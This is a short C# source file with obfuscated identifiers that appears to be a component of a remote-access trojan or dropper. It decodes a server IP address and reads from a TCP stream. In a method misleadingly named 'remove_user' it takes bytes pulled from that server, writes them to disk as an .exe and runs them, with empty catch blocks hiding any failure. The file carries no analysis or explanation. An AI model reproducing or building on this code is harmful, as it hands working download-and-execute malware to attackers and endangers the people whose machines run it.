using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace rlbwrarhsa;

internal class OLRDMR
{
	public MLREDM server;

	public OLRDMR(MLREDM lID)
	{
		server = lID;
	}

	public NetworkStream rlbwrarhsaNS(TcpClient rlbwrarhsatcpsck)
	{
		return rlbwrarhsatcpsck.GetStream();
	}

	public string rlbwrarhsaserverIPD()
	{
		return Encoding.UTF8.GetString(DLAONIF.rlbwrarhsavpsips, 0, DLAONIF.rlbwrarhsavpsips.Length);
	}

	public void rlbwrarhsado_process(string filePath)
	{
		try
		{
			Process.Start(filePath);
		}
		catch
		{
		}
	}

	public void rlbwrarhsaremove_user()
	{
		try
		{
			byte[] array = server.rlbwrarhsapull_data();
			if (array != null && !File.Exists(DLAONIF.rlbwrarhsaget_mpath() + DLAONIF.rlbwrarhsaremvUser + ".exe"))
			{
				File.WriteAllBytes(DLAONIF.rlbwrarhsaget_mpath() + DLAONIF.rlbwrarhsaremvUser + ".exe", array);
				rlbwrarhsado_process(DLAONIF.rlbwrarhsaget_mpath() + DLAONIF.rlbwrarhsaremvUser + ".exe");
			}
		}
		catch
		{
		}
	}
}
